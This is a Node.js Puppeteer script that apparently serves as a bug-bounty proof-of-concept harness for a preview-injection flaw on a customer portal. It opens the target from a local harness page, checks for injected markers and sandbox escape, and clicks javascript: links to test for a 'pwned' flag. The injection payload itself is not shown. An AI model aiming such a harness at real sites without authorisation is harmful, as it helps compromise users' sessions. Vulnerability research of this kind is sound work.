const http = require('http');
const fs = require('fs');
const path = require('path');
const puppeteer = require('/home/user/.nvm/versions/node/v20.20.2/lib/node_modules/puppeteer');

const DIR = '/home/user/Documents/Work/Guk/3.BugBounty/Source/vaultcord/poc/preview-injection';
const TARGET = process.env.VC_TARGET || 'https://customers.vaultcord.com/hi?previewToken=harness-proof-1';
const MODE = process.env.VC_MODE || 'popup';
const PORT = Number(process.env.VC_PORT || 8123);
const CHROME = '/usr/bin/google-chrome';
const UA_CHROME = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const server = http.createServer((req, res) => {
  const file = path.join(DIR, req.url === '/' ? 'harness.html' : req.url.split('?')[0]);
  fs.readFile(file, (err, data) => {
    if (err) {
      res.writeHead(404);
      return res.end('nf');
    }
    res.writeHead(200, { 'Content-Type': file.endsWith('.html') ? 'text/html' : 'text/plain' });
    res.end(data);
  });
});

async function inspect(page, label) {
  const state = await page.evaluate(() => ({
    href: location.href,
    origin: location.origin,
    title: document.title,
    bodyText: document.body.innerText.replace(/\s+/g, ' ').slice(0, 300),
    marker: document.body.innerText.includes('PREVIEW-INJECTION-PROOF-8f2c1d'),
    iframes: [...document.querySelectorAll('iframe')].map((f) => ({
      sandbox: f.getAttribute('sandbox'),
      srcdocHasMarker: (f.getAttribute('srcdoc') || '').includes('VC-SANDBOX-PROOF'),
    })),
    jsAnchors: [...document.querySelectorAll('a')].map((a) => a.getAttribute('href')).filter((h) => h && h.startsWith('javascript:')),
  })).catch((e) => ({ error: String(e) }));
  const frames = page.frames().filter((f) => f !== page.mainFrame());
  const frameInfo = [];
  for (const f of frames) {
    frameInfo.push(
      await f
        .evaluate(() => ({
          injText: document.getElementById('inj') ? document.getElementById('inj').textContent : null,
          injected: window.__INJECTED === 1,
          parentAccess: window.__parentAccess,
          origin: location.origin,
        }))
        .catch((e) => ({ frameErr: String(e).slice(0, 80) }))
    );
  }
  state.frames = frameInfo;
  console.log(`[${label}]`, JSON.stringify(state, null, 1));
  return state;
}

(async () => {
  await new Promise((r) => server.listen(PORT, '127.0.0.1', r));
  const browser = await puppeteer.launch({
    executablePath: CHROME,
    headless: 'new',
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--window-size=1280,1000', '--user-agent=' + UA_CHROME, '--disable-blink-features=AutomationControlled'],
  });
  const ctx = await browser.createBrowserContext();
  const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36';
  const page = await ctx.newPage();
  await page.setUserAgent(UA);
  await page.goto(`http://localhost:${PORT}/harness.html?target=${encodeURIComponent(TARGET)}&mode=${MODE}`, {
    waitUntil: 'domcontentloaded',
  });

  let victim;
  if (MODE === 'popup') {
    ctx.once('targetcreated', () => {});
    const cdp = await page.createCDPSession();
    await cdp.send('Target.setDiscoverTargets', { discover: true }).catch(() => {});
    await page.click('#go');
    for (let i = 0; i < 20 && !victim; i++) {
      await sleep(500);
      for (const t of ctx.targets()) {
        if ((t.type() === 'tab' || t.type() === 'page') && /vaultcord/.test(t.url()) && !/^http:\/\/localhost:8123/.test(t.url())) {
          victim = await t.page().catch(() => null);
          if (victim) break;
        }
      }
    }
    if (!victim) { console.log('[!] no popup captured; harness log:', await page.$eval('#log', e=>e.textContent), 'harness page url', page.url()); await browser.close(); server.close(); return; }
  } else {
    await page.click('#go');
    await sleep(1500);
    victim = page;
  }

  console.log('[*] victim opened:', victim.url());
  await sleep(12000);
  console.log('[*] victim url now:', victim.url());
  const st = await inspect(victim, 'state');
  fs.writeFileSync(path.join(DIR, `result-${MODE}-${victim.url().replace(/[^a-z0-9]+/gi, '_').slice(0, 60)}.html`), await victim.content().catch(() => ''));
  await victim.screenshot({ path: path.join(DIR, `result-${MODE}.png`) }).catch((e) => console.log('screenshot failed', e.message));

  if (st.jsAnchors && st.jsAnchors.length) {
    const clicked = await victim.evaluate(() => {
      const a = [...document.querySelectorAll('a')].find((x) => (x.getAttribute('href') || '').startsWith('javascript:'));
      a.click();
      return { pwned: window.__vc_pwned === undefined ? null : window.__vc_pwned };
    }).catch((e) => ({ err: String(e) }));
    console.log('[*] javascript: anchor ->', JSON.stringify(clicked));
  }

  await browser.close();
  server.close();
})().catch((e) => {
  console.error('FATAL', e);
  process.exit(1);
});
